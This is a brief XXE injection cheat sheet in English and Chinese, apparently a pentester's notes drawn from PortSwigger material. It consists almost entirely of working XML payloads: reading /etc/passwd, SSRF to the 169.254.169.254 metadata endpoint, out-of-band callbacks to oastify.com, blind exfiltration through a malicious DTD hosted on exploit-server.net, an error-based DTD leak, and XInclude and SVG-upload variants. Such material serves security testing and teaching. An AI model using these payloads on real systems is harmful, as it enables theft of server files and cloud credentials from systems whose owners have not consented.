XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access.

In some situations, an attacker can escalate an XXE attack to compromise the underlying server or other back-end infrastructure, by leveraging the XXE vulnerability to perform server-side request forgery (SSRF) attacks.

## 1. Principle

通过 XML 外部实体注入造成 SSRF

### 1.1. Location

所有存在 XML 格式的请求

```
<?xml version="1.0" encoding="UTF-8"?>
```

## 2. Test

### 2.1. DTD

注入 XXE, 窃取数据

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
```

### 2.2. SSRF

读取元数据

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
<foo>&xxe;</foo>
```

### 2.3. OOB

通过 OOB 平台验证 XXE

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://oastify.com"> ]>
<foo>&xxe;</foo>
```

### 2.4. XML Parameter OOB

如常规 XXE 无效, 可尝试在参数中插入以绕过

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://oastify.com"> %xxe; ]>
</foo>
```

### 2.5. Blind DTD

在恶意网站中写入 Payload

```
https://exploit-server.net/exploit
```

```
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://oastify.com/?x=%file;'>">
%eval;
%exfil;
```

请求 Payload 以实现 DTD

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-server.net/exploit"> %xxe;]>
</foo>
```

### 2.6. DTD Error Messages

在恶意网站中写入 Payload

```
https://exploit-server.net/exploit
```

```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```

请求 Payload 以实现 DTD 报错

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-server.net/exploit"> %xxe;]>
</foo>
```

### 2.7. XInclude

注入 XInclude 将包含的参数解析为 XML

```
<?xml version="1.0" encoding="UTF-8"?>
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```

### 2.8. File Upload

上传 SVG 文件实现 XXE

```
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```

---

**References**

- [XXE injection](https://portswigger.net/web-security/xxe)
- [CWE-611](https://hackerone.com/hacktivity/cwe_discovery?id=cwe-611)

